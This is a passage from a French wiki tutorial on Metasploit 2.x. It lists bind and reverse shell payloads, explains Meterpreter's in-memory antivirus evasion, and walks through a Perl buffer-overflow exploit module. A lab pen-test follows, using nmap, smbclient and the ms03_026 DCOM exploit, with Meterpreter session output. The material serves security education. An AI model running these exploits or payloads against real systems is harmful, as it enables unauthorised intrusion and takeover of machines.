+&#160;
+linux_sparc_bind
+Linux SPARC Bind Shell
+&#160;
+linux_sparc_findsock
+Linux SPARC SrcPort Find Shell
+&#160;
+linux_sparc_reverse
+Linux SPARC Reverse Shell</pre></div></div>
+<h2><span class="mw-headline" id="Payloads_Mac_OS_X"><span class="mw-headline-number">4.5</span> Payloads Mac OS X</span></h2>
+<p>Les failles Mac OS X, encore relativement récentes en comparaison aux autres systèmes d’exploitation implémentés, ne sont pas en reste dans le framework Metasploit avec des payloads de connect back pouvant également permettre parfois d’outrepasser certaines règles de filtrage.
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">osx_ppc_bind
+Mac OS X PPC Bind Shell
+&#160;
+osx_ppc_bind_stg
+Mac OS X PPC Staged Bind Shell
+&#160;
+osx_ppc_findrecv_stg
+Mac OS X PPC Staged Find Recv Shell
+&#160;
+osx_ppc_reverse
+Mac OS X PPC Reverse Shell
+&#160;
+osx_ppc_reverse_nf_stg
+Mac OS X PPC Staged Reverse Null-Free Shell
+&#160;
+osx_ppc_reverse_stg
+Mac OS X PPC Staged Reverse Shell</pre></div></div>
+<h2><span class="mw-headline" id="Payloads_Solaris"><span class="mw-headline-number">4.6</span> Payloads Solaris</span></h2>
+<p>Les payloads Solaris supportent les architectures Intel et Sparc avec, au choix, une connexion directe sur la machine attaquée ou en connect back.
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">solaris_ia32_bind
+Solaris IA32 Bind Shell
+solaris_ia32_findsock
+Solaris IA32 SrcPort Findsock Shell
+solaris_ia32_reverse
+Solaris IA32 Reverse Shell
+solaris_sparc_bind
+Solaris SPARC Bind Shell
+solaris_sparc_findsock
+Solaris SPARC SrcPort Find Shell
+solaris_sparc_reverse
+Solaris SPARC Reverse Shell</pre></div></div>
+<h2><span class="mw-headline" id="Payloads_Windows"><span class="mw-headline-number">4.7</span> Payloads Windows</span></h2>
+<p>Les payloads disponibles pour Windows sont incontestablement les plus évolués en raison du haut niveau d’abstraction que MS Windows propose, y compris sur du code bas niveau. Il est possible, via des appels d’API, des injections de DLL, etc., d’agir de façon très «&#160;localisée&#160;» sur la machine compromise. Les payloads VNC permettent un contrôle graphique à distance (via le fameux logiciel VNC en déportant l’affichage de la machine compromise.
+</p><p>Nous détaillerons plus bas avec précision le cas des payloads win32_bind_meterpreter et win32_findrecv_ord_meterpreter qui permettent d’obtenir un environnement haut niveau complet.
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">win32_adduser
+Windows Execute net user /ADD
+win32_bind
+Windows Bind Shell
+win32_bind_dllinject
+Windows Bind DLL Inject
+win32_bind_meterpreter
+Windows Bind Meterpreter DLL Inject
+win32_bind_stg
+Windows Staged Bind Shell
+win32_bind_stg_upexec
+Windows Staged Bind Upload/Execute
+win32_bind_vncinject
+Windows Bind VNC Server DLL Inject
+win32_exec
+Windows Execute Command
+win32_findrecv_ord_meterpreter
+Windows Recv Tag Findsock Meterpreter
+win32_findrecv_ord_stg
+Windows Recv Tag Findsock Shell
+win32_findrecv_ord_vncinject
+Windows Recv Tag Findsock VNC Inject</pre></div></div>
+<h1><span class="mw-headline" id="La_charge_utile_Meterpreter"><span class="mw-headline-number">5</span> La charge utile Meterpreter</span></h1>
+<p>Meterpreter ou Meta-Interpreter) est une charge utile qui est disponible, dans la plateforme d'exploitation Metasploit, pour les systèmes d'exploitation de type Microsoft Windows. Meterpreter propose de nombreuses fonctionnalités comme les redirections de port, les opérations sur les fichiers et les injections de DLL mais également les exécutions furtives dites tout en mémoire.
+</p><p>Meterpreter (pour Meta-Interpreter) est un payload disponible pour Windows. Il permet d’ajouter une couche d’abstraction à l’exploitation classique en proposant de nombreuses fonctionnalités avancées&#160;: redirection de port, opérations sur le système de fichier, configuration réseau, injection, etc.
+</p><p>Il est également possible de développer de nouvelles DLL injectables par la suite grâce à une API documentée disponible. L’intégralité du code exécuté par Meterpreter est localisé en mémoire vive, évitant les accès au disque et pouvant ainsi outrepasser de nombreux antivirus.
+</p><p>En fonctionnant à un niveau système «&#160;bas&#160;», Meterpreter peut contourner de nombreuses protections qui sont souvent trop coûteuses à mettre en place à ce niveau, en termes de performances. Meterpreter s’exécute dans le contexte de l’application vulnérable et ne crée aucun nouveau processus ou thread.
+</p><p>Un moteur cryptographique est également fourni pour garantir la confidentialité des échanges entre le framework et la machine exploitée.
+</p><p>Nous ne détaillerons pas les API Meterpreter et les démarches pour le développement de DLL, les documentations étant <a rel="nofollow" class="external text" href="http://www.metasploit.org/projects/Framework/docs/meterpreter.pdf">très abondantes à ce sujet</a> et la programmation Windows n’étant pas le principal objet de l’article.
+</p><p>Les payloads implémentant Meterpreter sont win32_bind_meterpreter et win32_findrecv_ord_meterpreter. Après exploitation de la faille, le payload envoie la DLL de Meterpreter et la charge dans la mémoire du processus ainsi exploité&#160;:
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">[*] Uploading dll to memory (69643), Please wait...
+[*] Upload completed
+meterpreter&gt;
+[ -= connected to =- ]
+[ -= meterpreter server =- ]
+[ -= v. 00000500 =- ]
+&#160;
+meterpreter&gt; help
+&#160;
+Core Core feature set commands
+------------ ----------------
+read Reads from a communication channel
+write Writes to a communication channel
+close Closes a communication channel
+interact Switch to interactive mode with a channel
+help Displays the list of all register commands
+exit Exits the client
+initcrypt Initializes the cryptographic subsystem
+&#160;
+Extensions Feature extension commands
+------------ ----------------
+loadlib Loads a library on the remote endpoint
+use Uses a feature extension module</pre></div></div>
+<p>Il est alors possible de charger différents modules externes&#160;:
+</p>
+<ul><li> Fs pour l’accès au système de fichiers (navigation, upload/download de fichiers)</li>
+<li> Net pour la configuration réseau, le routage, ainsi que le forwarding de ports.</li>
+<li> Process pour la gestion des processus distants (lancement, arrêt, listage)</li>
+<li> Sys permettant la récupération d’informations système.</li></ul>
+<pre>Meterpreter&gt; use -m Net, Process, Sys, Fs
+</pre>
+<p>D’autres fonctionnalités peuvent être ajoutées en développant des librairies dynamiques pour l’occasion.
+</p><p>Le moteur cryptographique peut être lancé avec la commande initcrypt. 
+</p>
+<h1><span class="mw-headline" id="Scripting"><span class="mw-headline-number">6</span> Scripting</span></h1>
+<p>Metasploit fournit un ensemble de fonctions qui permettent de gagner un temps considérable pour le développement d’exploits vis à vis de la méthode classique. Retrouvez dans cette partie un exemple concret qui facilitera la compréhension de plusieurs de ces fonctions de façon détaillée.
+</p><p>L’abstraction fournie par Metasploit pour le développement d’exploits permet de gagner énormément de temps en comparaison à un exploit «&#160;from scratch&#160;» développé sans modèle, sans librairie, et en C par exemple. Nous détaillerons ici un exemple fourni dans la documentation permettant de cerner plusieurs fonctions.
+</p><p>Le code commence encore une fois par une définition classique Perl, avec le nom de l’exploit (ici «&#160;vuln1_3&#160;» car l’exploit s’appelle vuln1_3.pm)&#160;:
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">package Msf::Exploit::vuln1_3;
+use strict;
+use base 'Msf::Exploit';
+use Msf::Socket::Tcp;
+use Pex::Text;</pre></div></div>
+<p>Puis une structure “interne” permettant de définir le nombre de caractères à écrire avant l’adresse de retour, qui sera elle aussi plusieurs fois écrite (il faudra soigner l’alignement sur les 4 octets d’un processeur 32 bits)&#160;:
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">my $advanced = {
+# Calculated at 76, give some room for different paddings, etc
+'PreRetLength' =&gt; [76 - 8, 'Space before the we start writing return address.'],
+'RetLength' =&gt; [32, 'Length of rets to write (in bytes)'],
+};</pre></div></div>
+<p>Vient ensuite la structure d’informations qui sera récupérée par Metasploit pour décrire l’exploit dans son interface, contenant par la même occasion l’adresse de retour standard de l’OS visé (ici l’adresse 0xbffffffa60, qui est une adresse située dans la pile, ( <a rel="nofollow" class="external text" href="http://fr.wikipedia.org/wiki/Pile_(informatique)">stack</a> )&#160;:
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">my $info = {
+'Name' =&gt; 'Vuln1 v3 Exploit',
+'Version' =&gt; '$Revision: 1.1 $',
+'Authors' =&gt; [ 'spoonm', ],
+'Arch' =&gt; [ 'x86' ],
+'OS' =&gt; [ 'linux'],
+'Priv' =&gt; 1,
+&#160;
+'UserOpts' =&gt;
+{
+'RHOST' =&gt; [1, 'ADDR', 'The target address'],
+'RPORT' =&gt; [1, 'PORT', 'The target port', 11221],
+},
+'Payload' =&gt;
+{
+'Space' =&gt; 500,
+'BadChars' =&gt; &quot;&quot;,
+'MinNops' =&gt; 16,
+'Keys' =&gt; ['+findsock'],
+},
+'Description' =&gt; Pex::Text::Freeform(qq{With new Findsock Action}),
+'Refs' =&gt;
+[
+'www.metasploit.com',
+],
+&#160;
+'DefaultTarget' =&gt; -1,
+'Targets' =&gt;
+[
+['Slackware Linux', 0xbffffa60],
+],
+};</pre></div></div>
+<p>Puis le contructeur classique&#160;:
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">sub new {
+my $class = shift;
+my $self = $class-&gt;SUPER::new({'Info' =&gt; $info, 'Advanced' =&gt; $advanced}, @_);
+&#160;
+return($self);
+}</pre></div></div>
+<p>Le code, à proprement dit, de l’exploit se situe dans la routine Exploit avec ses différents arguments (RHOST et RPORT, TARGET et CPORT étant des paramètres annexes). La première partie définit les variables avec les arguments passés et/ou les valeurs par défaut. La connexion s’établit avec Msf::Socket::Tcp. Le payload complet se nomme ici «&#160;evil&#160;».
+</p><p>La commande pack avec le template “V” permet de convertir la valeur en unsigned long au format little endian pour un adressage mémoire Intel classique. L’envoi du payload s’effectue alors avec la méthode Send puis la tentative d’attachement est réalisée avec $self-&gt;Handler($sock). Le code doit toujours se terminer avec la dernière ligne («&#160;1&#160;;&#160;»)
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">sub Exploit {
+my $self = shift;
+my $targetHost = $self-&gt;GetVar('RHOST');
+my $targetPort = $self-&gt;GetVar('RPORT');
+my $targetIndex = $self-&gt;GetVar('TARGET');
+my $srcPort = $self-&gt;GetVar('CPORT'); # Get src port from env
+my $encodedPayload = $self-&gt;GetVar('EncodedPayload');
+my $shellcode = $encodedPayload-&gt;Payload;
+my $target = $self-&gt;Targets-&gt;[$targetIndex];
+my $ret = $target-&gt;[1];
+&#160;
+my $sock = Msf::Socket::Tcp-&gt;new(
+'PeerAddr' =&gt; $targetHost,
+'PeerPort' =&gt; $targetPort,
+'LocalPort' =&gt; $srcPort,
+);
+if($sock-&gt;IsError) {
+$self-&gt;PrintLine('Error creating socket: ' . $sock-&gt;GetError);
+return;
+}
+&#160;
+$self-&gt;PrintLine('Trying ' . $target-&gt;[0] . ' - ' . sprintf('0x%08x', $ret));
+&#160;
+my $evil = 'A' x $self-&gt;GetLocal('PreRetLength');
+$evil .= pack('V', $ret) x int($self-&gt;GetLocal('RetLength') / 4);
+$evil .= $shellcode;
+$sock-&gt;Send($evil);
+$self-&gt;Handler($sock);
+&#160;
+return;
+}
+1;</pre></div></div>
+<h1><span class="mw-headline" id="M.C3.A9thodologie_d.E2.80.99un_audit_de_s.C3.A9curit.C3.A9"><span class="mw-headline-number">7</span> Méthodologie d’un audit de sécurité</span></h1>
+<p>Retrouver dans cette partie les détails relatifs aux étapes nécessaires à la réalisation d'un audit de sécurité, cet audit sera effectué sur un réseau simulé à l'aide de machines virtuelles de type Vmware. L'utilisation de Metasploit est ici conjointe à l'utilisation d'outils comme Nmap, Nessus et Netcat.
+</p><p>Nous détaillerons ici, de manière succincte, les différentes étapes d’un pen-test (penetration testing) sur un réseau simulé basé sur des machines virtuelles <a rel="nofollow" class="external text" href="http://www.vmware.com/">vmware</a> . Voici les informations concernant le réseau de tests&#160;:
+</p><p>Machine d’audit&#160;: 172.16.185.1 Linux<br />
+Réseau audité&#160;: 172.16.185.0/24
+</p><p>Les outils utilisés pour cet audit sont tous gratuits. il s’agit d’outils très connus dans le domaine de la sécurité&#160;:
+</p>
+<ul><li> <a rel="nofollow" class="external text" href="http://www.insecure.org/">nmap</a></li>
+<li> <a rel="nofollow" class="external text" href="http://www.nessus.org/">nessus</a></li>
+<li> <a rel="nofollow" class="external text" href="http://www.metasploit.org/">Metasploit</a></li>
+<li> <a rel="nofollow" class="external text" href="http://netcat.sourceforge.net/">netcat</a></li></ul>
+<h2><span class="mw-headline" id="Machine_virtuelle_Windows_2000"><span class="mw-headline-number">7.1</span> Machine virtuelle Windows 2000</span></h2>
+<p>La première étape est une «&#160;reconnaissance&#160;» du réseau audité grâce à un ping scan de l’outil nmap.
+</p><p>Nous découvrons alors 4 machines sur ce réseau&#160;: 172.16.185.1 (notre machine), 172.16.185.100, 172.16.185.101 et 172.16.185.254. Les premiers tests plus approfondis s’effectuent sur l’hôte
+</p><p>172.16.185.101 via un scan TCP nmap (option –sT) avec reconnaissance de l’OS (option –O) et des services (option –sV). Les résultats du scan sont plutôt positifs pour un test d’intrusion et laissent apparaître un défaut de mises à jour évident sur une ancienne version de <a rel="nofollow" class="external text" href="http://www.linux-france.org/prj/inetdoc/securite/tutoriel/tutoriel.securite.attaquesprotocoles.netbios.html">Windows 2000</a>.
+</p><p>Nous lançons alors un scan Nessus qui permettra de confirmer ou d’infirmer nos suppositions et de tester différentes failles connues. Nous activons le mode «&#160;safe checks&#160;» afin d’éviter un crash de la machine distante, ce qui peut néanmoins donner quelques faux positifs. Nous vérifierons le résultat du scan grâce à la plateforme Metasploit. N’ayant pas de contrainte de furtivité, nous utiliserons également le module nmap de Nessus en mode insane pour accélérer le processus.
+</p><p>Le résultat confirme que la machine auditée présente de nombreuses failles critiques, notamment en raison de dernières mises à jour trop anciennes.
+</p><p>La probabilité de réussite de l’exploitation est ici très élevée mais nous devons cependant obtenir des informations plus précises concernant la machine distante&#160;: version Windows, numéro du service pack, langue, etc.
+</p><p>Les exploits sous Windows étant la plupart du temps relativement peu «&#160;portables&#160;», ces informations sont capitales quant aux chances de réussite de l’exploitation future. Une erreur entraînera presque à coup sur un plantage et il s’agit souvent d’exploits one shot ne laissant pas l’opportunité de relancer un test après une exploitation infructueuse, augmentant également les chances de détection de l’attaque.
+</p><p><a rel="nofollow" class="external text" href="http://www.linux-france.org/prj/inetdoc/securite/tutoriel/tutoriel.securite.attaquesprotocoles.netbios.html">Netbios</a> étant activé et non filtré sur la machine auditée, nous allons récupérer des informations importantes via l’utilitaire smbclient contenu dans le package samba-client de la plupart des distributions Linux&#160;:
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">lapt41p:~# smbclient -L 172.16.185.101
+Domain=[VM2000] OS=[Windows 5.0] Server=[Windows 2000 LAN Manager]
+&#160;
+Sharename Type Comment
+--------- ---- -------
+Impressions Disk
+IPC$ IPC IPC distant
+ADMIN$ Disk Administration distance
+C$ Disk Partage par dfaut
+session request to 172.16.185.101 failed (Called name not present)
+session request to 172 failed (Called name not present)
+Domain=[VM2000] OS=[Windows 5.0] Server=[Windows 2000 LAN Manager]
+&#160;
+Server Comment
+--------- -------
+&#160;
+Workgroup Master
+--------- -------</pre></div></div>
+<p>Accès aux informations Netbios de la machine
+</p><p>La première information est qu’il s’agit bien effectivement d’une machine sous Windows 2000 et que la langue a de grandes chances d’être le Français (noms des partages). Ces informations permettront de définir les targets de Metasploit.
+</p><p>Les références des failles Nessus recensées permettent ensuite de choisir l’exploit à lancer contre cette machine… Le choix est large pour cette machine&#160;! Metasploit se charge ensuite du reste&#160;:
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">msf &gt; use msrpc_dcom_ms03_026
+msf msrpc_dcom_ms03_026 &gt; set PAYLOAD win32_bind_meterpreter
+PAYLOAD -&gt; win32_bind_meterpreter
+&#160;
+msf msrpc_dcom_ms03_026(win32_bind_meterpreter) &gt; show options
+Exploit and Payload Options
+===========================
+&#160;
+Exploit: Name Default Description
+-------- ------ ------- ------------------
+required RHOST The target address
+required RPORT 135 The target port
+&#160;
+Payload: Name Default Description
+-------- -------- -------------------------------------------------
+required EXITFUNC thread Exit technique: &quot;process&quot;, &quot;thread&quot;, &quot;seh&quot;
+required METDLL /home/user/Softs/Securite/Progs/metasploit_2.5/dat a/meterpreter/metsrv.dll The full path the meterpreter server dll
+required LPORT 4444 Listening port for bind shell
+&#160;
+Target: Windows NT SP3-6a/2K/XP/2K3 English ALL
+&#160;
+msf msrpc_dcom_ms03_026(win32_bind_meterpreter) &gt; set TARGET 0
+TARGET -&gt; 0
+msf msrpc_dcom_ms03_026(win32_bind_meterpreter) &gt; set RHOST 172.16.185.101
+RHOST -&gt; 172.16.185.101
+msf msrpc_dcom_ms03_026(win32_bind_meterpreter) &gt; set LPORT 12345
+LPORT -&gt; 12345
+msf msrpc_dcom_ms03_026(win32_bind_meterpreter) &gt; exploit
+[*] Starting Bind Handler.
+[*] Splitting RPC request into 7 packets
+[*] Got connection from 172.16.185.1:40770 &lt;-&gt; 172.16.185.101:12345
+[*] Sending Stage (2834 bytes)
+[*] Sleeping before sending dll.
+[*] Uploading dll to memory (69643), Please wait...
+[*] Upload completed
+meterpreter&gt;
+[ -= connected to =- ]
+[ -= meterpreter server =- ]
+[ -= v. 00000500 =- ]
+meterpreter&gt; use -m Fs
+loadlib: Loading library from 'ext356083.dll' on the remote machine.
+meterpreter&gt;
+loadlib: success.
+meterpreter&gt; cd \
+cd: Changing directory to '’
+meterpreter&gt;
+cd: success.
+meterpreter&gt; ls
+ls: Requesting a directory listing
+meterpreter&gt;
+Listing: *
+Size Type Name
+--------- ----- ----------------
+145.50 KB REG arcldr.exe
+(…)</pre></div></div>
+<h1><span class="mw-headline" id="Conclusion"><span class="mw-headline-number">8</span> Conclusion</span></h1>
+<p>Les audits intrusifs sont aujourd'hui une part intégrante dans le domaine de la sécurité des systèmes d’information, les chances de recencer des vulnérabilités, lors de ces audits, sont d'autant plus importantes si l'on se positionne à la manière d'un attaquant potentiel. Retrouvez dans cette partie les conclusions du dossier sur Metasploit ainsi que l'ensemble des liens relatifs à celui-ci.
+</p><p>Les audits intrusifs se sont démocratés peu à peu dans le milieu de la sécurité des systèmes d’information. Jusqu’alors très mal perçus en raison de leur caractère offensif, ils se révèlent finalement très adaptés à la sécurisation des infrastructures. Il est en effet utopique de croire qu’un réseau peut être sécurisé par des personnes n’ayant pas la culture des failles de sécurité qu’il peut contenir.
+</p><p>En se plaçant dans la même situation qu’un individu malicieux (les audits intrusifs peuvent être réalisés «&#160;à l’aveugle&#160;» en conditions réelles, de l’intérieur et/ou de l’extérieur, sans information préalable), les chances de recenser les vulnérabilités sont plus élevées et la sensibilisation d’autant plus forte que les répercutions de l’attaque sont démontrées et directement visibles par les clients.
+</p><p>Certaines politiques de sécurité visent systématiquement à «&#160;imposer&#160;» la sécurité aux utilisateurs mais ne serait-ce t’il pas plus judicieux de leur faire intégrer cette nouvelle dimension, souvent mal accueillie&#160;?
+</p><p>A plus petite échelle, un utilisateur «&#160;lambda&#160;» ne souhaite généralement pas entrer un mot de passe long et complexe… N’est-il pas plus intéressant de le sensibiliser sur le sujet, de lui expliquer, voire lui démontrer via une présentation, l’intérêt de cette «&#160;contrainte&#160;» qui lui est imposée&#160;?
+</p><p>Les tests d’intrusion actifs sont un élément important de cette politique de sensibilisation et ont un impact global très fort, tant sur les décideurs que sur les utilisateurs.
+</p><p>Metasploit est une plateforme de choix mais reste cependant complémentaire à d’autres outils. Son utilisation et son ergonomie, certes complexes pour un non-technicien, sont très appréciées par les personnes travaillant dans le domaine de la sécurité.
+</p><p>De nombreux chercheurs l’utilisent également en raison de sa souplesse et de la rapidité avec laquelle de nouveaux exploits peuvent être développés. Les briques Metasploit (payloads, encodeurs, etc.) sont réutilisables aisément et permettent de concentrer les efforts sur le travail amont&#160;: recherche des vulnérabilités, désassemblage, analyse de code…
+</p>
+<h1><span class="mw-headline" id="Ressources"><span class="mw-headline-number">9</span> Ressources</span></h1>
+<p><a rel="nofollow" class="external free" href="http://www.secuobs.com/news/28122007-metasploit.shtml">http://www.secuobs.com/news/28122007-metasploit.shtml</a>
+</p>
+<!-- 
+NewPP limit report
+CPU time usage: 0.028 seconds
+Real time usage: 0.029 seconds
+Preprocessor visited node count: 272/1000000
+Preprocessor generated node count: 510/1000000
+Post‐expand include size: 0/2097152 bytes
+Template argument size: 0/2097152 bytes
+Highest expansion depth: 2/40
+Expensive parser function count: 0/100
+-->
+
+<!-- 
+Transclusion expansion time report (%,ms,calls,template)
+100.00%    0.000      1 - -total
+-->
+
+<!-- Saved in parser cache with key blocnotesinfo-wiki_:pcache:idhash:2373-0!*!*!1!en!*!* and timestamp 20181111230844 and revision id 5323
+ -->
+</div>									<div class="printfooter">
+						Retrieved from "<a dir="ltr" href="https://wiki.deimos.fr/index.php?title=Metasploit_2.x&amp;oldid=5323">https://wiki.deimos.fr/index.php?title=Metasploit_2.x&amp;oldid=5323</a>"					</div>
+													<div id='catlinks' class='catlinks catlinks-allhidden'></div>												<div class="visualClear"></div>
+							</div>
+		</div>
+		<div id="mw-navigation">
+			<h2>Navigation menu</h2>
+
+			<div id="mw-head">
+									<div id="p-personal" role="navigation" class="" aria-labelledby="p-personal-label">
+						<h3 id="p-personal-label">Personal tools</h3>
+						<ul>
+							<li id="pt-login"><a href="https://wiki.deimos.fr/index.php?title=Special:UserLogin&amp;returnto=Metasploit+2.x" title="You are encouraged to log in; however, it is not mandatory [o]" accesskey="o">Log in</a></li>						</ul>
+					</div>
+									<div id="left-navigation">
+										<div id="p-namespaces" role="navigation" class="vectorTabs" aria-labelledby="p-namespaces-label">
+						<h3 id="p-namespaces-label">Namespaces</h3>
+						<ul>
+															<li  id="ca-nstab-main" class="selected"><span><a href="Metasploit_2.x.html"  title="View the content page [c]" accesskey="c">Page</a></span></li>
+													</ul>
+					</div>
+										<div id="p-variants" role="navigation" class="vectorMenu emptyPortlet" aria-labelledby="p-variants-label">
+												<h3 id="p-variants-label"><span>Variants</span><a href="Metasploit_2.x.html#"></a></h3>
+
+						<div class="menu">
+							<ul>
+															</ul>
+						</div>
+					</div>
+									</div>
+				<div id="right-navigation">
+										<div id="p-views" role="navigation" class="vectorTabs" aria-labelledby="p-views-label">
+						<h3 id="p-views-label">Views</h3>
+						<ul>
+															<li id="ca-view" class="selected"><span><a href="Metasploit_2.x.html" >Read</a></span></li>
+															<li id="ca-viewsource"><span><a href="https://wiki.deimos.fr/index.php?title=Metasploit_2.x&amp;action=edit"  title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></span></li>
+															<li id="ca-history" class="collapsible"><span><a href="https://wiki.deimos.fr/index.php?title=Metasploit_2.x&amp;action=history"  title="Past revisions of this page [h]" accesskey="h">View history</a></span></li>
+													</ul>
+					</div>
+										<div id="p-cactions" role="navigation" class="vectorMenu emptyPortlet" aria-labelledby="p-cactions-label">
+						<h3 id="p-cactions-label"><span>More</span><a href="Metasploit_2.x.html#"></a></h3>
+
+						<div class="menu">
+							<ul>
+															</ul>
+						</div>
+					</div>
+										<div id="p-search" role="search">
+						<h3>
+							<label for="searchInput">Search</label>
+						</h3>
+
+						<form action="https://wiki.deimos.fr/index.php" id="searchform">
+														<div id="simpleSearch">
+															<input type="search" name="search" placeholder="Search" title="Search Deimos.fr / Bloc Notes Informatique [f]" accesskey="f" id="searchInput" /><input type="hidden" value="Special:Search" name="title" /><input type="submit" name="fulltext" value="Search" title="Search the pages for this text" id="mw-searchButton" class="searchButton mw-fallbackSearchButton" /><input type="submit" name="go" value="Go" title="Go to a page with this exact name if exists" id="searchButton" class="searchButton" />								</div>
+						</form>
+					</div>
+									</div>
+			</div>
+			<div id="mw-panel">
+				<div id="p-logo" role="banner"><a style="background-image: url(images/a/a7/Logo_deimosfr.png);" href="index.html"  title="Visit the main page"></a></div>
+						<div class="portal" role="navigation" id='p-navigation_et_RSS' aria-labelledby='p-navigation_et_RSS-label'>
+			<h3 id='p-navigation_et_RSS-label'>navigation et RSS</h3>
+
+			<div class="body">
+									<ul>
+													<li id="n-cd-.7E"><a href="index.html">cd ~</a></li>
+											</ul>
+							</div>
+		</div>
+			<div class="portal" role="navigation" id='p-Menu' aria-labelledby='p-Menu-label'>
+			<h3 id='p-Menu-label'>Menu</h3>
+
+			<div class="body">
+									<ul>
+													<li id="n-Solaris"><a href="Solaris.html">Solaris</a></li>
+													<li id="n-BSD"><a href="BSD.html">BSD</a></li>
+													<li id="n-Linux"><a href="Linux.html">Linux</a></li>
+													<li id="n-Mac-OS-X"><a href="Mac_OS_X.html">Mac OS X</a></li>
+													<li id="n-Windows"><a href="Windows.html">Windows</a></li>
+													<li id="n-Servers"><a href="Serveurs.html">Servers</a></li>
+													<li id="n-Development"><a href="Développement.html">Development</a></li>
+													<li id="n-Ethical-Hacking"><a href="Hacking_éthique.html">Ethical Hacking</a></li>
+													<li id="n-Network"><a href="Réseaux.html">Network</a></li>
+													<li id="n-Divers"><a href="Divers.html">Divers</a></li>
+											</ul>
+							</div>
+		</div>
+			<div class="portal" role="navigation" id='p-Liens' aria-labelledby='p-Liens-label'>
+			<h3 id='p-Liens-label'>Liens</h3>
+
+			<div class="body">
+									<ul>
+													<li id="n-Welcome-Page"><a href="http://www.deimos.fr" rel="nofollow">Welcome Page</a></li>
+													<li id="n-Blog"><a href="http://blog.deimos.fr" rel="nofollow">Blog</a></li>
+													<li id="n-Resume"><a href="https://www.linkedin.com/in/pmavro/" rel="nofollow">Resume</a></li>
+													<li id="n-GitHub"><a href="https://github.com/deimosfr" rel="nofollow">GitHub</a></li>
+											</ul>
+							</div>
+		</div>
+			<div class="portal" role="navigation" id='p-Google_Search' aria-labelledby='p-Google_Search-label'>
+			<h3 id='p-Google_Search-label'>Google Search</h3>
+
+			<div class="body">
+									
+<div><form action="http://www.google.fr/cse" id="cse-search-box">
+    <input type="hidden" name="cx" value="partner-pub-8001790276473966:7664586454" />
+    <input type="hidden" name="ie" value="UTF-8" />
+    <input type="text" name="q" size="12" />
+    <input type="submit" name="sa" value="Search" />
+</form></div>			</div>
+		</div>
+			<div class="portal" role="navigation" id='p-googletranslator' aria-labelledby='p-googletranslator-label'>
+			<h3 id='p-googletranslator-label'>Translate</h3>
+
+			<div class="body">
+									<div id="google_translate_element"></div><script>
+                                        function googleTranslateElementInit() {
+                                          new google.translate.TranslateElement({
+                                            pageLanguage: 'fr',
+                                            includedLanguages: 'en,de,es'
+                                          }, 'google_translate_element');
+                                        }
+                                        </script><script src="http://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>			</div>
+		</div>
+			<div class="portal" role="navigation" id='p-tb' aria-labelledby='p-tb-label'>
+			<h3 id='p-tb-label'>Tools</h3>
+
+			<div class="body">
+									<ul>
+													<li id="t-whatlinkshere"><a href="./Special:WhatLinksHere/Metasploit_2.x.html" title="A list of all wiki pages that link here [j]" accesskey="j">What links here</a></li>
+													<li id="t-recentchangeslinked"><a href="https://wiki.deimos.fr/Special:RecentChangesLinked/Metasploit_2.x" title="Recent changes in pages linked from this page [k]" accesskey="k">Related changes</a></li>
+													<li id="t-specialpages"><a href="https://wiki.deimos.fr/Special:SpecialPages" title="A list of all special pages [q]" accesskey="q">Special pages</a></li>
+													<li id="t-print"><a href="https://wiki.deimos.fr/index.php?title=Metasploit_2.x&amp;printable=yes" rel="alternate" title="Printable version of this page [p]" accesskey="p">Printable version</a></li>
+													<li id="t-permalink"><a href="https://wiki.deimos.fr/index.php?title=Metasploit_2.x&amp;oldid=5323" title="Permanent link to this revision of the page">Permanent link</a></li>
+													<li id="t-info"><a href="https://wiki.deimos.fr/index.php?title=Metasploit_2.x&amp;action=info" title="More information about this page">Page information</a></li>
+											</ul>
+							</div>
+		</div>
+				</div>
+		</div>
+		<div id="footer" role="contentinfo">
+							<ul id="footer-info">
+											<li id="footer-info-lastmod"> This page was last modified on 3 January 2008, at 07:33.</li>
+											<li id="footer-info-copyright">Content is available under <a class="external" rel="nofollow" href="http://creativecommons.org/licenses/by-nc-sa/3.0/deed.fr">Attribution - Pas d’Utilisation Commerciale - Partage dans les Mêmes Conditions 3.0 non transposé</a> unless otherwise noted.</li>
+									</ul>
+							<ul id="footer-places">
+											<li id="footer-places-privacy"><a href="https://wiki.deimos.fr/blocnotesinfo:Privacy_policy" title="blocnotesinfo:Privacy policy">Privacy policy</a></li>
+											<li id="footer-places-about"><a href="https://wiki.deimos.fr/blocnotesinfo:About" title="blocnotesinfo:About">About Deimos.fr / Bloc Notes Informatique</a></li>
+											<li id="footer-places-disclaimer"><a href="https://wiki.deimos.fr/blocnotesinfo:General_disclaimer" title="blocnotesinfo:General disclaimer">Disclaimers</a></li>
+									</ul>
+										<ul id="footer-icons" class="noprint">
+											<li id="footer-copyrightico">
+															<a href="http://creativecommons.org/licenses/by-nc-sa/3.0/deed.fr"><img src="http://i.creativecommons.org/l/by-nc-sa/3.0/88x31.png" alt="Attribution - Pas d’Utilisation Commerciale - Partage dans les Mêmes Conditions 3.0 non transposé" width="88" height="31" /></a>
+													</li>
+											<li id="footer-poweredbyico">
+															<a href="https://www.mediawiki.org/"><img src="resources/assets/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" srcset="resources/assets/poweredby_mediawiki_132x47.png 1.5x, resources/assets/poweredby_mediawiki_176x62.png 2x" width="88" height="31" /></a>
